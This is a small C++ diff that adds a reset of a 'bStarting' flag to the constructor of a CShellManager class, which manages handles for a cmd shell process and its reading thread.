@@ -16,6 +16,7 @@ BOOL bStarting = TRUE;
 
 CShellManager::CShellManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
 {
+	bStarting = TRUE;
 	m_hThreadRead = NULL;
 	m_hShellProcessHandle   = NULL;    //保存Cmd进程的进程句柄和主线程句柄
 	m_hShellThreadHandle	= NULL;
